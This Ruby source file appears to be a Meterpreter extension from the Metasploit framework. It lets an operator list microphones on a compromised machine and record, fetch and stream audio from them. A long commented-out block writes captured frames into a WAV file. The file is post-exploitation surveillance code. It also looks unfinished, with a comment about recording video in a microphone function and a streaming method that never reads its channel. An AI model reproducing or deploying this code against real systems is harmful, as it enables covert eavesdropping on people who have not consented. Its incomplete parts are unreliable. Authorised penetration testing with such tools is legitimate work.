# -*- coding: binary -*-

require 'rex/post/meterpreter/channel'
require 'rex/post/meterpreter/channels/pools/audio'

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Stdapi
          module Mic

            ###
            #
            # This meterpreter extension can list and capture from microphone
            #
            ###
            class Mic
              include Msf::Post::Common

              def initialize(client)
                @client = client
              end

              def session
                @client
              end

              def mic_list
                response = client.send_request(Packet.create_request('audio_interface_list'))
                names = []
                response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_FULLNAME).each do |tlv|
                  names << tlv.value
                end
                names
              end

              # Starts recording video from video source of index +cam+
              def mic_start(mic)
                request = Packet.create_request('audio_interface_start')
                request.add_tlv(TLV_TYPE_AUDIO_INTERFACE_NAME, mic)
                channel_id = client.send_request(request)
                # begin
                #   client.mic.mic_start(index)
                #   mic_started = true
                #   ::Timeout.timeout(duration) do
                #     ::File.open(stream_path, 'wb') do |outfd|
                #       numchannels = 1
                #       sampleratehz = 11025
                #       bitspersample = 16
                #       datasize = 2000000000
                #       subchunk1size = 16
                #       chunksize = 4 + (8 + subchunk1size) + (8 + datasize)
                #       byterate = sampleratehz * numchannels * bitspersample / 8
                #       blockalign = numchannels * bitspersample / 8
                #
                #       BinData::Int32be.new(0x52494646).write(outfd)    # ChunkID: "RIFF"
                #       BinData::Int32le.new(chunksize).write(outfd)     # ChunkSize
                #       BinData::Int32be.new(0x57415645).write(outfd)    # Format: "WAVE"
                #       BinData::Int32be.new(0x666d7420).write(outfd)    # SubChunk1ID: "fmt "
                #       BinData::Int32le.new(16).write(outfd)            # SubChunk1Size
                #       BinData::Int16le.new(1).write(outfd)             # AudioFormat
                #       BinData::Int16le.new(numchannels).write(outfd)   # NumChannels
                #       BinData::Int32le.new(sampleratehz).write(outfd)  # SampleRate
                #       BinData::Int32le.new(byterate).write(outfd)      # ByteRate
                #       BinData::Int16le.new(blockalign).write(outfd)    # BlockAlign
                #       BinData::Int16le.new(bitspersample).write(outfd) # BitsPerSample
                #       BinData::Int32be.new(0x64617461).write(outfd)    # SubChunk2ID: "data"
                #       BinData::Int32le.new(datasize).write(outfd)      # SubChunk2Size
                #     end
                #     stream_index = 0
                #     while client do
                #       if play_audio && (stream_index == start_delay)
                #         cmd_listen(stream_path)
                #       end
                #       data = client.mic.mic_get_frame(quality)
                #       if data
                #         ::File.open(stream_path, 'a') do |f|
                #           f.write(data)
                #         end
                #         data = nil
                #       end
                #       stream_index += 1
                #       sleep 1
                #     end
                #   end
                # rescue ::Timeout::Error
                # ensure
                #   client.mic.mic_stop if mic_started
                # end
                mic_stream(channel_id)
              end

              def mic_get_frame(quality)
                request = Packet.create_request('audio_interface_get_frame')
                request.add_tlv(TLV_TYPE_AUDIO_DURATION, quality)
                response = client.send_request(request)
                response.get_tlv(TLV_TYPE_AUDIO_DATA).value
              end

              def mic_stop
                client.send_request(Packet.create_request('audio_interface_stop'))
                true
              end

              def mic_stream(channel_id)
                ## Read from channel
                @channel = Channel.create(client, 'audio_interface_stream', Rex::Post::Meterpreter::Channel::Stream,
                               CHANNEL_FLAG_SYNCHRONOUS)
                
              end

              attr_accessor :client
            end
          end
        end
      end
    end
  end
end
